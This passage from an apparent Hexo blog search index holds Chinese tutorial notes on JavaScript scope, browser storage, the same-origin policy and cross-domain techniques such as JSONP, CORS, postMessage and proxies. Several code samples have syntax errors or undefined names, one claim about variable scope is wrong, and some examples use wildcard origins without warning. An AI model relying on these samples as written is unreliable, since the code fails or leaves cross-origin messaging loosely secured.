值得注意的是，mouseover和mouseout虽然也有事件冒泡，但是处理它们的时候需要特别的注意，因为需要经常计算它们的位置，处理起来不太容易。 不适合的就有很多了，举个例子，mousemove，每次都要计算它的位置，非常不好把控，在不如说focus，blur之类的，本身就没用冒泡的特性，自然就不能用事件委托了。]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js作用域]]></title>
    <url>%2F2018-05-14-scopeChain.html</url>
    <content type="text"><![CDATA[js的作用域作用域作用：访问、操作、调用..域：区域、范围、空间作用域就是变量和函数的可访问范围，或者说是变量或者函数起作用的区域 1.js函数的作用域函数内的区域，就是这个函数的作用域，变量和函数在这个区域内都可以访问操作。最外层函数外的区域叫全局作用域，函数内的区域叫局部作用域 2.js变量的作用域在源代码中变量所在的区域就是这个变量的作用域。变量在这个区域内可以被访问。在全局作用域上定义的变量叫做全局变量，在函数内部定义的变量叫做局部变量。 全局变量与局部变量① 全局作用域（Global Scope）最外层函数或者最外层函数定义的变量具有全局作用域 12345var outer = 'outer';function fn()&#123; console.log(outer);&#125;fn(); //outer ② 所有未定义直接赋值的变量自动声明为全局作用域 123456function fn()&#123; inner= 'inner'; &#125;fn();console.log(inner); //inner ③ 所有window对象的属性拥有全局作用域 局部作用域（Local Scope）局部作用域一般只在固定的代码片段可以访问到，对于函数外部是无法访问的,最常见的例如函数内部 123456function fn()&#123; var inner= 'inner'; &#125;fn();console.log(inner); //undefined 注意：只要函数内定义了一个局部变量，函数在解析的时候都会将这个变量提前声明 1234567var global = 'global';function fn()&#123; console.log(global); //undefined var global = 'newGlobal'; console.log(global); //newGlobal&#125;console.log(global); //global 相当于 12345678var global = 'global';function fn()&#123; var global; //提前声明了局部变量； console.log(global); //undefined var global = 'newGlobal'; console.log(global); //newGlobal&#125;console.log(global); //global 执行环境（Execution Contexts）也可以翻译为执行上下文，当解释器进入到ECMAScript的可执行代码，解释器就进入一个执行环境，活动的执行环境组成了逻辑上的一个栈，在这个逻辑栈顶部的执行环境是当前运行的执行环境。js为每一个执行环境关联了一个变量对象，环境中定义的所有变量和函数都保存在这个对象中。js的执行顺序是根据函数的调用来决定的，当一个函数的变量对象弹出，把控制权交给了之前的执行环境变量对象。 变量对象(Variable Object)、活动对象(Activation Object)和Arguments对象(Arguments Object)当前执行环境的变量对象始终在作用域链的第0位。 解析器处理代码时的两个阶段： 我们都知道javascript解析器是一段一段解析处理代码的，为什么？这就要涉及解析器处理代码时的两个阶段，解析代码和执行代码。 当解析器进入执行环境时，变量对象就会添加执行环境中声明的变量和函数作为它的属性，这就意味着变量和函数在声明之前已经可用，变量值为undefined，这就是变量和函数声明提升(Hoisting)的原因，与此同时作用域链和this确定，此过程为解析阶段，俗称预解析。接着解析器开始执行代码，为变量添加相应值的引用，得到执行结果，此过程为执行阶段。 作用域链（Scope Chain）作用域链是js内部中一种变量、函数查找机制，它决定了变量和函数的作用范围，即作用域。函数对象和其他对象一样，拥有可以通过代码访问的属性和一系列仅供js引擎访问的内部属性。其中一个内部属性就是scope，该内部属性包含了函数被创建的作用域中对象的集合，这个集合就是被称为函数的作用域链，决定了那些数据能被函数访问。 在函数执行过程中，没遇到一个变量，都会经历一次标识符解析过程以决定从哪里获取和存储数据。该过程从作用域链头部，也就是从活动对象开始搜索，查找同名的标识符，如果找到了就使用这个标识符对应的变量，如果没找到继续搜索作用域链中的下一个对象，如果搜索完所有对象都未找到，则认为该标识符未定义。函数执行过程中，每个标识符都要经历这样的搜索过程。 四、作用域链和代码优化从作用域链的结构可以看出，在运行期上下文的作用域链中，标识符所在的位置越深，读写速度就会越慢。如上图所示，因为全局变量总是存在于运行期上下文作用域链的最末端，因此在标识符解析的时候，查找全局变量是最慢的。所以，在编写代码的时候应尽量少使用全局变量，尽可能使用局部变量。一个好的经验法则是：如果一个跨作用域的对象被引用了一次以上，则先把它存储到局部变量里再使用 优化前： 12345function changeColor()&#123; document.getElementById("btnChange").onclick=function()&#123; document.getElementById("targetCanvas").style.backgroundColor="red"; &#125;;&#125; 优化后： 123456function changeColor()&#123; var doc=document; doc.getElementById("btnChange").onclick=function()&#123; doc.getElementById("targetCanvas").style.backgroundColor="red"; &#125;;&#125;]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cookie LocalStorage sessionStorage]]></title>
    <url>%2F2018-05-13-saveStorage.html</url>
    <content type="text"><![CDATA[Cookie/LocalStorage/essionStorage 一、数据的生命周期Cookie 一般由服务器生成，可设置失效时间，如果在浏览器端生成Cookie，默认是关闭浏览器后失效LocalStorage 除非被清除，否则永远保存sessionStorage 仅在当前会话下有效，关闭页面或浏览器后被清除 二、存放数据大小Cookie 4K 左右LocalStorage 一般为 5MBsessionStorage 一般为 5MB 三、与服务器端通信Cookie 每次都会携带在HTTP头中，如果使用Cookie 保存过多数据会带来性问题LocalStorage sessionStorage 仅在客户端（浏览器）中保存，不参与和服务器的通信 四、易用性Cookie 需要程序员自己封装，源生的Cookie接口不友好LocalStorage sessionStorage 源生接口可以接受，亦可再次封装来对Object和Array有更好的支持 LocalStorage/lobalStorage/sessionStorage/Cookie/Session△1.Localstorage 是 html5存储数据的方式，在HTML5中，本地存储是一个window的属性，包括localStorage和sessionStorage.HTML5本地存储只能存字符串，任何格式存储的时候都会被自动转为字符串，所以读取的时候，需要自己进行类型的转换。是永久性存储，当然用户可以通过浏览器设置来删除 2.globalStorage 目的是跨越会话存储数据，不过要指定哪些域可以访问该数据，如果不使用removeItem（）或delete删除，或者用户未清除浏览器缓存，存储在globalStorage上的数据会一直保留在磁盘上，所以globalStorage非常适合在客户端存储文档或者长期保留用户偏好设置 3.localStorage在HTML5中作为保持客户端数据的方案取代globalStorage，它不能被指定访问规则，要访问localStorage，页面必须来自 同一个域名，使用同一种协议，在同一个端口上，它的数据也保留到通过JavaScript删除或用户清除浏览器缓存 4.Cookie 是存在浏览器端，每次浏览器发送请求都会携带cookie信息，如果是第一次请求的话就是没有Cookie。Cookie是可以通过域名下面的页面共享，不同域名下面的Cookie不共享。父级目录下面的cookie，子目录是可以获取到的，但是子级上的cookie，父级获取不到。cookie是有过去的时间的，一般默认的关闭时间是页面关闭的时间，时间是可以自己设置的。cookie的格式是一个字符串，是一个键值对的形式。cookie是有大小限制的，一般是4K，如果数据太大的话，会影响传递速度或是效率。Document.cookie可以来设置获取cookie的信息。 5.Session 存储于服务端，依赖于cookie，服务端相当于有一个session存储区，没有大小的限制 Web存储（localStorage与sessionStorage）目的：让客户端可以存储数据。区别： localStorage 除非人为地删除，否则存储的数据将被用久保存下来 sessionStorage 存储的数据仅在浏览器的一次会话中有效，当结束会话时，数据被请除。 以localStorage为例： 123456if(window.localStorage)&#123; console.log("支持web存储标准");&#125;else&#123; console.log("不支持web存储标准");&#125; 方法与属性： setItem(&#39;key&#39;,&#39;data&#39;)通过该方法对数据进行存储，它接受两个参数，键名、要存储的数据。 localStorage.setItem(‘key’,’data’);sessionStorage.setItem(‘key’,’data’); getItem() 通过该方法获取以及存储的数据，它接受一个参数，对用的键名 localStorage.getItem(‘key’);sessionStorage.getItem(‘key’); removeItem() 通过该方法删除某条已经存储的数据，它接受一个参数：对用的键名 localStorage.removeItem(‘key’);sessionStorage.removeItem(‘key’); clear() 通过该方法可以清除所有已经存储的数据 localStorage.clear();sessionStorage.clear(); key() 通过该方法可以获得已存储的数据的键名，它接受一个参数，数值索引，与该数组相似，该索引从下标为0开始 localStorage.key(2);sessionStorage.key(2); length 唯一的属性，用过该属性可以得知已存储的数据数量 localStorage.length ();sessionStorage.length (); Cookie/session/localStorage的区别 cookie的内容主要包括：名字、值、过期时间、路径和域。路径与域一起构成cookie的作用范围。若不设置时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就会消失。这种生命期为浏览器会话期的cookie被称为会话cookie。会话cookie一般不存储在硬盘而是保存在内存里，当然这个行为并不是规范规定的。若设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再打开浏览器这些cookie仍然有效直到超过设定的过期时间。对于保存在内存里的cookie，不同的浏览器有不同的处理方式session机制。当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识（称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用（检索不到，会新建一个），如果客户端请求不包含session id，则为客户端创建一个session并且生成一个与此session相关联的session id，session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应中返回给客户端保存。保存这个session id的方式可以采用cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发送给服务器。 cookie/session的区别：1、cookie数据存放在客户的浏览器上，session数据放在服务器上2、cookie不是很安全，别人可以分析存放在本地的cookie并进行cookie欺骗，考虑到安全应当使用session3、session会在一定时间内保存在服务器上，当访问增多，会比较占用你服务器的性能，考虑到减轻服务器性能方面，应当使用cookie4、单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie5、建议将登录信息等重要信息存放为session，其他信息如果需要保留，可以放在cookie中6、session保存在服务器，客户端不知道其中的信息；cookie保存在客户端，服务器能够知道其中的信息7、session中保存的是对象，cookie中保存的是字符串8、session不能区分路径，同一个用户在访问一个网站期间，所有的session在任何一个地方都可以访问到，而cookie中如果设置了路径参数，那么同一个网站中不同路径下的cookie互相是访问不到的 浏览器本地存储与服务器端存储的区别 其实数据既可以在浏览器本地存储，也可以在服务器端存储浏览器可以保存一些数据，需要的时候直接从本地存取，sessionStorage、localStorage和cookie都是由浏览器存储在本地的数据服务器端也可以保存所有用户的所有数据，但需要的时候浏览器要向服务器请求数据。1、服务器端可以保存用户的持久数据，如数据库和云存储将用户的大量数据保存在服务器端2、服务器端也可以保存用户的临时会话数据，服务器端的session机制，如jsp的session对象，数据保存在服务器上 实际上，服务器和浏览器之间仅需传递session id即可，服务器根据session id找到对应用户的session对象，会话数据仅在一段时间内有效，这个时间就是server端设置的session有效期 服务器端保存所有的用户的数据，所以服务器端的开销较大，而浏览器端保存则把不同用户需要的数据分别保存在用户各自的浏览器中，浏览器端一般只用来存储小数据，而非服务可以存储大数据或小数据服务器存储数据安全一些，浏览器只适合存储一般数据 sessionStorage/localStorage/cookie的区别 共同点：都是保存在浏览器端、且同源的区别：1、cookie数据始终在同源的http请求中携带（即使不需要），即 cookie在浏览器和服务器间来回传递，而sessionStorage和localStorage不会自动把数据发送给服务器，仅在本地保存。cookie数据还有路径 path 的概念，可以限制cookie只属于某个路径下2、存储大小限制也不同，cookie数据不能超过4K，同时因为每次http请求都会携带cookie、所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大3、数据有效期不同sessionStorage：仅在当前浏览器窗口关闭之前有效localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据cookie：只在设置的cookie过期时间之前有效，即使窗口关闭或浏览器关闭4、作用域不同sessionStorage不在不同的浏览器窗口中共享即使是同一个页面localstorage在所有同源窗口中都是共享的cookie也是在所有同源窗口中都是共享的5、web Storage支持事件通知机制，可以将数据更新的通知发送给监听者6、web Storage的api接口使用更方便 sessionStorage与页面js数据对象的区别 页面中一般的js对象的生存期仅在当前页面有效，因此刷新页面或转到另一页面这样的重新加载页面的情况，数据就不存在了而sessionStorage只要同源的同窗口中，刷新页面或进入同源的不同页面，数据始终存在，也就是说只要浏览器不关闭，数据仍然存在]]></content>
      <categories>
        <category>浏览器缓存</category>
      </categories>
      <tags>
        <tag>浏览器缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[同源策略]]></title>
    <url>%2F2018-05-13-same-origin-policy.html</url>
    <content type="text"><![CDATA[同源策略含义是一种约定，是浏览器最核心也是最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能都会受到影响，可以说web是构建在同源策略基础之上，浏览器只是针对同源策略的一种实现。所谓的同源指的是域名、协议、端口相同。 这也是狭义的跨域，跨域指的是一个域下的文档或者脚本试图去请求另一个域下的资源。另外广义的跨域： 资源跳转：A链接、重定向、表单提交 资源嵌入：link/script/img/frame等 dom 标签，样式中的 background:url()/@font-face()等文件外链 脚本请求：js 发起的 ajax 请求，dom 和 js 对象的跨域操作等 目的保证了用户的信息安全，防止恶意的网站去窃取数据，A网站是一家银行，用户登录后就去浏览其他的网站，如果其他网站可以读A网站的cookie，而cookie往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为，浏览器还规定，提交表单不受不同源政策的影响。 限制的范围1.cookie、LocalStorage 和 IndexDB无法读取2.DOM 无法获取3.AJAX请求无法发送 常见跨域场景1234567891011121314151617181920URL 说明 是否运行通信http://www.domain.com/a.js 同一个域名，不同文件路径 运行http://www.domain.com/b.jshttp://www.domain.com/lab/c.jshttp://www.domain.com:8000/a.js 同一域名，不同端口 不允许http://www.domain.com/b.js http://www.domain.com/a.js 同一域名，不同协议 不允许https://www.domain.com/a.jshttp://www.domain.com/a.js 域名和域名对应的ip相同 不允许https://192.168.4.12/b.jshttp://www.domain.com/a.js 主域相同，子域不同 不允许http://x.domain.com/b.jshttp://domain.com/c.jshttp://www.domain1.com/a.js 不同域名 运行http://www.domain2.com/b.js 跨域解决方案 通过 jsonp跨域 document.domain+iframe跨域 location.hash+iframe跨域 postMessage跨域 window.name+iframe跨域 跨资源共享（CORS） nginx代理跨域 nodejs中间件代理跨域 webSocket协议跨域 详解通过 jsonp 跨域通常为了减轻 web 服务器的负载，我们把 js/css/img 等静态资源分离到另一台独立域名的服务器上，在 html 页面中再通过相应的标签从不同域名下加载静态资源，而被浏览器允许，基于此原理，我们可以通过动态创建 script，再请求一个带参网址实现跨域通信。 原生实现 1234567891011let script = document.createElement('script');script.type = 'text/javascript';// 传参一个回调函数后给后端，方便后端返回时候执行这个在前端定义的回调函数script.src = 'http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback';document.head.appendChild(script);// 回调执行函数function handleCallback(res)&#123; console.log(JSON.stringify(res));&#125; 服务端返回如下（返回时即执行全局函数） 1handleCallback(&#123;status:true,user:admin&#125;) jquery ajax 实现 1234567$.ajax(&#123; url:'http://www.domain2.com:8080/login', type:'get', dataType:'jsonp', jsonpCallback:'handleCallback', data:&#123;&#125;&#125;) vue.js 实现 123456this.$http.jsonp('http://www.domain2.com:8080/login',&#123; params:&#123;&#125;, jsonp:'handleCallback',&#125;).then(res =&gt;&#123; console.log(res)&#125;) 后端 node.js 12345678910111213141516let querystring = require('querystring');let http = require('http');let server = http.createServer();server.on('request',function(req,res)&#123; let params = qs.parse(req.url.split('?').[1]) let fn = params.callback; // jsonp 返回设置 res.writeHead(200,&#123;Content-Type;'text/javascript'&#125;) res.write(`($&#123;JSON.stringify(params)&#125;)`) res.send()&#125;)server.listen('8080');console.log('server is running at port 8080') jsonp缺点：只能实现 get 一种请求。 document.domain + iframe 跨域此方案仅限主域相同，子域不同的跨域应用场景 实现原理：两个页面都通过 js 强制设置 document.domain为基础主域，就实现了主域。 父窗口：http://www.domain.com/a.html 12345&lt;iframe id='iframe' src="http://www.child.domain.com/b.html"&gt;&lt;/iframe&gt;&lt;script&gt; document.domain = 'domain.com' var user = 'admin';&lt;/script&gt; 子窗口：http://child.domain.com/b.html 1234&lt;script&gt; document.domain = 'domain.com' console.log(window.parent.user)&lt;/script&gt; location.hash + iframe 跨域实现原理：a 想跟 b 跨域相互通信，通过中间页 c 来实现，三个页面，不同域之间利用 iframe 的 location.hash 传值，相同域之间通过 js 访问来通信 具体实现： A：a.html -&gt; B：b.html -&gt; A：c.html a 与 b 不同域只能通过 hash 值单向通信，b 与 c 不同域名也只能单向通信，但 c 与 a 同域，所以 c 可以通过 parent.parent访问 a 页面的所有对象 a.html：http://www.domain1.com/a.html 123456789101112&lt;iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none"&gt;&lt;/iframe&gt;&lt;script&gt; let iframe = document.getElementById('iframe') // 向 b.html 传 hash setTimeout(function()&#123; iframe.src = iframe.src + '#user=admin'; &#125;,1000) // 开始给同域 c.html 的回调方法 function onCallback(res)&#123; console.log(res) &#125;&lt;/script&gt; b.html：http://www.domain1.com/c.html 123456&lt;script&gt; // 监听 b.html 传来的 hash 值，再传给 c.html window.onhashchange = function()&#123; iframe.src = iframe.src + location.hash &#125;&lt;/script&gt; c.html：http://www.domain1.com/c.html 1234567&lt;script&gt; // 监听 b.html 传来的 hash 值 window.onhashchange = function()&#123; // 再通过操作同域 a.html 的js回调，将结果返回 window.parent.parent.onCallback(location.hash.replace('#user=','')) &#125;&lt;/script&gt; window.name + iframe 跨域window.name 属性的独特之处：name 值在不同页面（甚至不同域名）加载后依旧存在，并且可以支持非常长更多 name 值（2MB） a.html：http://www.domain1.com/a.html 1234567891011121314151617181920212223242526272829let proxy = function(url,callback)&#123; let state = 0; let iframe = document.createElement('iframe'); // 加载跨域页面 iframe.src = url; // onload 事件会触发2次，第一次加载跨域页，并留存数据于 window.name iframe.onload = function()&#123; if(state === 1)&#123; // 第 2 次 onload 成功后，读取同域 window.name 中数据 callback(iframe.contentWindow.name) destoryFrame(); &#125;else if(state === 0)&#123; iframe.contentWindow.location = 'http://www.domain1.com/proxy.html' state = 1; &#125; &#125; document.body.appendChild(iframe) // 获取数据后销毁和这个 iframe，释放内存，这也保证了安全（不被其他 iframe js 访问） function destoryFrame()&#123; iframe.contentWindow.document.write(''); iframe.contentWindow.close(); document.body.removeChild(iframe); &#125;&#125;proxy('http://www.domain2.com/b.html',function(data)&#123; console.log(data);&#125;) proxy.html：http://www.domain1.com/proxy.html 中间代理页，与 a.html 同域，内容为空即可。 b.html：http://www.domain2.com/b.html 123&lt;script&gt; window.name = 'This is domain2 data!'&lt;/script&gt; 通过 iframe 的 src 属性由外域转向本地域，跨域数据即由 iframe 的 window.name 从外域传递到本地域。这个就是巧妙绕过了浏览器的跨域访问限制，但同时它又是安全操作。 postMessage 跨域postMessage 是 HTML5 XMLHttpRequest Level 2 中的 API,且是为数不多的可以跨域操作的 window 属性之一，它可以用于解决下面的问题： 页面和其打开的新窗口的数据传递 多窗口之间消息传递 页面与嵌套的 iframe 消息传递 上面三个场景的跨数据传递 用法： postMessage(data,origin) 方法接受两个参数 data：html5 规范支持任意基本类型或者可复制的对象，但部分浏览器只支持字符串，所以传参时最好使用 JSON.stringify序列化 origin：协议+主机+端口号，可以配置为 “*”,表示可以传递任意的窗口，如果要指定和当前的窗口同源的话设置为 “/“ a.html：http://www.domain1.com/a.html 123456789101112131415&lt;iframe id="iframe" src="http://www.domain2.com/b.html" style="display:none"&gt;&lt;/iframe&gt;&lt;script&gt; let iframe =document.getElementById('iframe'); iframe.onload = function()&#123; let data = &#123; name:'haha' &#125; // 向 domain2 传送跨域数据 iframe.contentWindow.postMessage(JSON.stringify(data),'http://www.domain2.com') &#125; // 接受 domain2 返回数据 window.addEventListener('message',function(e)&#123; console.log(e.data) &#125;,false);&lt;/script&gt; b.html：http://www.domain2.com/b.html 123456789101112&lt;script&gt; // 接受 domain1 的数据 window.addEventListener('message',function(e)&#123; console.log(e.data) let data = JSON.parse(e.data) if(data)&#123; data.number = 16; // 处理完之后再发送给 domain1 window.parent.postMessage(JSON.stringify(data),'http://www.domain1.com') &#125; &#125;,false);&lt;/script&gt; 跨域资源共享（CORS）普通跨域请求：服务端设置 Access-Control-Allow-Origin即可，前端无需设置，若要带 cookie 请求：前后端都需要设置。 需要注意的是：由于同源策略的限制，所要读取的 cookie 为跨域请求接口所在域名的 cookie，而非当前页。 目前，主流的浏览器都支持该功能（IE8+/9 需要使用 XDomainRequest对象来支持 CORS），CORS 也已经成为主流的跨域解决方案 前端设置原生 ajax: 12// 前端设置是否带 cookiexhr.withCredentials = true; 1234567891011var xhr = new XMLHttpRequest(); // IE8/9 需要使用 window.XDomainRequest 兼容// 前端设置是否带有 cookiexhr.withCredentials = true;xhr.open('post','http://www.domain2.com:8080/login',true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('user=admin');xhr.onreadystatechange = function()&#123; if(xhr.readyState == 4 &amp;&amp; xhr.status == 200)&#123; console.log(xhr.responseText); &#125;&#125; jquery ajax 123456$.ajax(&#123; xhrFields:&#123; withCredentials:true // 前端是否带 cookie &#125;, crossDomain:true // 会让请求头中噶博涵跨域的额外信息，但不会包含 cookie&#125;) axios 1axios.defaults.withCredentials = true 服务端设置java 后端： 123456// 允许跨域访问的域名：若有端口需要写全（协议+域名+端口），若没有端口结尾不用加 '/'response.setHeader('Access-Control-Allow-Origin','http://www.domain1.com');// 允许前端带认证 cookie:启用此项后上面的域名不能为 "*"，必须指定具体的域名，否则浏览器会有提示response.setHeader('Access-Control-Allow-Credentials','true');// 提示 OPTIONS 预检时，后端需要设置的两个常用自定头response.setHeader('Access-Control-Allow-Headers','Content-Type,X-Requested-With') Node.js 后端： 12345678910111213141516171819202122232425262728const http = require('http');const server = http.createServer();const qs = require('querystring');server.on('request',(req,res)=&gt;&#123; let postData = ''; // 数据块接收中 req.addListener('data',(chunk)=&gt;&#123; postData +=chunk; &#125;) // 数据块接收完毕 req.addListener('end',()=&gt;&#123; postData = qs.parse(postData); // 跨域后台设置 res.writeHead(200,&#123; 'Access-Control-Allow-Credentials':'true', // 后端允许发送 cookie 'Access-Control-Allow-Origin':'http://www.domain1.com', // 允许访问的域（协议+域名+端口） /* * 此处设置的cookie还是domain2的而非domain1，因为后端也不能跨域写cookie(nginx反向代理可以实现)， * 但只要domain2中写入一次cookie认证，后面的跨域接口都能从domain2中获取cookie，从而实现所有的接口都能跨域访问 */ 'Set-Cookie':'l=a123456;Path=/;Domain=www.domain2.com;HttpOnly' // HttpOnly的作用是让js无法读取cookie &#125;) res.write(JSON.stringify(postData)) res.end(); &#125;)&#125;).listen('8080'); nginx 代理跨域nginx 配置解决 iconfont 跨域 浏览器跨域访问 js/css/img 等常规静态资源被同源策略许可，但 iconfont 字体文件（eot|otf|ttf|woff|svg）除外，此时可在 nginx 的静态资源服务器中加入以下配置 123location / &#123; add_header Access-Control-Allow-Origin:*;&#125; nginx 反向代理接口跨域 跨域原理：同源策略是浏览器的安全策略，不是 HTTP 协议的一部分。服务端调用 HTTP 接口只是使用 HTTP 协议，不会执行 JS 脚本，不需要同源策略，也就不存在跨域问题。 实现思路：通过 nginx 配置一个代理服务器（域名与 domain1相同，端口不同）做跳板机，反向代理访问 domain2 接口，并且可以顺便修改 cookie 中的 domain 信息，方便当前域 cookie 写入，实现跨域登录。 nginx 具体配置： 12345678910111213server&#123; listen 81; server_name www.domain1.com location / &#123; proxy_pass http://www.domain2.com:8080, proxy_cookie_domain www.domain2.com www.domain1.com index index.html index.htm add_header Access-Control-Allow-Origin http://www.domain1.com add_header Access-Control-Credentials true &#125;&#125; 前端代码： 123456const xhr = new XMLHttpRequest();xhr.withCredentials = true;xhr.open('get','http://www.domain1.com:81/?user=admin',true)xhr.send(); Node 后台实例： 12345678910111213141516const http = require('http');const server = http.createServer();const qs = require('querystring');server.on('request',(req,res)=&gt;&#123; const params = qs.parse(req.url.substring(2)) res.writeHead(200,&#123; 'Set-cookie':'l+a123456;Path=/;Domain=www.domain2.com;HttpOnly' &#125;); res.write(JSON.stringify(params)) res.send();&#125;);server.listen('8080')console.log('server is running at port 8080'); Nodejs 中间件代理跨域node 中间件实现跨域代理，原理大致与 nginx 相同，都是通过一个代理服务器，实现数据的转发，也可以通过设置 cookieDomainRewrite 参数修改响应头中的 cookie 中域名，试下你当前域的 cookie 写入，方便接口登录认证。 非 vue 框架的 跨域（2次跨域） node+express+http-proxy-middleware 搭建一个 proxy 服务器 前端代码： 123456const xhr = new XMLHttpRequest();xhr.WithCredentials = true;xhr.open('get','http://www.domain1.com:3000/login?user=admin',true);xhr.send(); 中间件服务器： 1234567891011121314151617181920const express = require('express');const proxy = require('http-proxy-middleware');const app = new express();app.use('/',proxy(&#123; // 代理跨域接口目标 target:'http://www.domain2.com:8080', changeOrigin:true, // 修改响应头信息，实现跨域并允许带 cookie onProxyRes:function(proxyRes,req,res)&#123; res.header('Access-Control-Allow-Origin','http://www.domain1.com') res.header('Access-Control-Allow-Credentials','true') &#125;, // 修改响应信息中的 cookie 域名 cookieDomainRewrite:'www.domain1.com' // 可以为 false，表示不修改&#125;))app.listen(3000)console.log('Proxy server is listen at port 3000...'); vue 框架的跨域（1次跨域） node +webpack+webpack-dev-server 代理接口跨域。在开发环境下，由于 vue 渲染服务和接口代理服务都是 webpack-dev-server 同一个，所以页面与代理接口之间不再跨域，无需设置 headers 跨域信息。 webpack.config.js 123456789101112131415module.exports = &#123; entry:&#123;&#125;, module:&#123;&#125;, devSever:&#123; historyApiFallback:true, proxy:[&#123; context:'/login', target:'http://www.domain2.com:8080', changeOrigin:true, secure:false, cookieDomainRewrite:'www.domain1.com' &#125;], noInfo:true &#125;&#125; WebSocket 协议跨域websocket protocol 是 HTML5 一种新的协议，它实现了浏览器与服务器全双工通信，同时运行跨域通讯，是 server push 技术的一种很好的实现。 这里使用了 socket.io，它很好地封装了 webSocket 的接口，提供了更方便、灵活的接口，也对不支持 webSocket 的浏览器提供了向下兼容。 前端代码： 1234567891011121314151617181920&lt;div&gt;user input: &lt;input type="text"&gt;&lt;/div&gt;&lt;script src="https://cdn.bootcss.com/socket.io/2.2.0/socket.io.js"&gt;&lt;/script&gt;&lt;script&gt; const socket = io('http://www.domain2.com:8080'); socket.on('connect',function()&#123; // 监听服务端信息 socket.on('message',function(msg)&#123; console.log(msg) &#125;) // 监听服务端关闭 socket.on('disconnect',function()&#123; console.log('server socket has closed.'); &#125;) &#125;) document.getElementByTagName('input')[0].onblur = function()&#123; socket.send(this.value); &#125;;&lt;/script&gt; NodeJs socket 后台： 1234567891011121314151617181920212223242526const http = require('http');const socket = require('socket.io');const server = http.createServer((req,res)=&gt;&#123; res.writeHead(200,&#123; 'Content-type':'text/html' &#125;) res.send();&#125;)server.listen('8080');console.log('Server is running at port 8080');// 监听 socket 连接socket.listen(server).on('connnection',function(client)&#123; // 接受信息 client.on('message',function(msg)&#123; client.send(msg); console.log(msg); &#125;) // 断开处理 client.on('disconnect',function()&#123; console.log('client socket has closed') &#125;)&#125;); 旧的整理Cookiecookie是服务器写入浏览器的一小段信息，只有同源的网页才可以共享，但是如果两个网页的一级域名相同，只是二级域名不同，浏览器允许通过设置 document.domain 来共享Cookie. A:http://w1.example.con/a.htmlB:http://w2.example.com/b.html 那么只要设置相同的document.domain就可以共享cookie了 document.domain = ‘example.com’ 在A网页设置一个cookie document.cookie = “test = hello “ B网页就可以读到这个Cookie var allCookie = document.cookie; 这种方式只适用于Cookie和iframe窗口，LocalStorage和IndexDB无法通过这种方法，规范同源策略要使用PostMessage API,另外在设置Cookie的时候，要指定Cookie的所属域名为一级域名，比如.example.com。 Set-Cookie: key=value; domain=.example.com; path=/ 这样的话，二级域名和三级域名不用做任何设置，都可以读取这个Cookie。 iframe如果两个网页不同源，就无法拿到对方的DOM，典型的例子是iframe窗口和window.open方法打开的窗口，它们与父窗口没有办法通信。 document.getElementById(“myIFrame”).contentWindow.document// Uncaught DOMException: Blocked a frame from accessing a cross-origin frame. 上面命令中，父窗口想获取子窗口的DOM，因为跨源导致报错。反之亦然，子窗口获取主窗口的DOM也会报错。 window.parent.document.body// 报错 如果两个窗口一级域名相同，只是二级域名不同，那么设置上一节介绍的document.domain属性，就可以规避同源政策，拿到DOM。对于完全不同源的网站，目前有三种方法，可以解决跨域窗口的通信问题。（1）片段识别符（fragment identifier）（2）window.name（3）跨文档通信API（Cross-document messaging） 2.1 片段识别符片段标识符指的是，URL的#号后面的部分，比如 http://example.com/x.html#fragment的 #fragment 父窗口可以把信息，写入子窗口的片段标识符。 var src = originURL + &#39;#&#39; + data;document.getElementById(‘myIFrame’).src = src; 子窗口通过监听hashchange事件得到通知。 window.onhashchange = checkMessage;function checkMessage() { var message = window.location.hash; // …} 同样的，子窗口也可以改变父窗口的片段标识符。 parent.location.href= target + “#” + hash; 2.2 window.name浏览器窗口有window.name属性。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。父窗口先打开一个子窗口，载入一个不同源的网页，该网页将信息写入window.name属性。 window.name = data; 接着，子窗口跳回与主窗口同域的网址 location = ‘http://parent.url.com/xxx.html&#39;; 然后，主窗口就可以读取子窗口的window.name了。 var data = document.getElementById(‘myFrame’).contentWindow.name; 这种方法的优点是，window.name容量很大，可以放置非常长的字符串；缺点是必须监听子窗口window.name属性的变化，影响网页性能。 2.3 window.postMessage跨文档通信API（Cross-documentmessaging）这个API为window对象新增了一个window.postMessage方法，允许跨窗口通信，不论这两个窗口是否同源。举例来说，父窗口http://aaa.com向子窗口http://bbb.com发消息，调用postMessage方法就可以了。 var popup = window.open(‘http://bbb.com&#39;, ‘title’);popup.postMessage(‘Hello World!’, ‘http://bbb.com&#39;); postMessage 方法的第一个参数是具体的信息内容，第二个参数是接受信息的窗口的源（origin）,即“协议+域名+端口”,也可以设为“*”,表示不限制域名，向所有窗口发送。子窗口向父窗口发送信息的写法类似。 window.opener.postMessage(‘hello’,’http://aa.com&#39;); 父窗口或者是子窗口都可以通过message事件，监听对方的信息 window.addEvenListener(‘message’,function(e){ console.log(e.data);},false); message 事件的事件对象 event 提供以下三个属性event.source 发送信息的窗口event.origin 消息发向的网站event.data 消息内容下面的例子是，子窗口通过event.source属性引用父窗口，然后发送消息。 1234window.addEventListener('message', receiveMessage); function receiveMessage(event) &#123; event.source.postMessage('Nice to see you!', '*'); &#125; event.origin属性可以过滤不是发给本窗口的消息。 123456789window.addEventListener('message', receiveMessage); function receiveMessage(event) &#123; if 